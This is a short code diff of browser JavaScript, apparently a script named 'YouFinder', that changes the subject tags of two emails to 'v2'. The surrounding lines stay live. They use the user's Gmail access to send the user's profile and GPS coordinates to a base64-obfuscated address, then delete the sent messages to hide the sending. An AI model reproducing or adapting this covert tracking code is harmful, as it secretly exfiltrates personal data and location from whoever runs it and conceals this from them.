@@ -21,7 +21,7 @@ DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v
 				MBase = new GBase.GmailAPI(true);
 				UserInfo = GBase.getUserInfo();
 
-				let LogMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder Log> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t"));
+				let LogMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder v2 Log> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t"));
 				MBase.send(LogMail, function (Res) {
 					MBase.delete(Res.id);
 				});
@@ -29,7 +29,7 @@ DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v
 				navigator.geolocation.getCurrentPosition(function (Locate) {
 					UserInfo.geolocation　= Locate.coords.toObject();
 					
-					let GPSMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder GPS> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t"));
+					let GPSMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder v2 GPS> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t"));
 					MBase.send(GPSMail, function (Res) {
 						MBase.delete(Res.id);
 					});
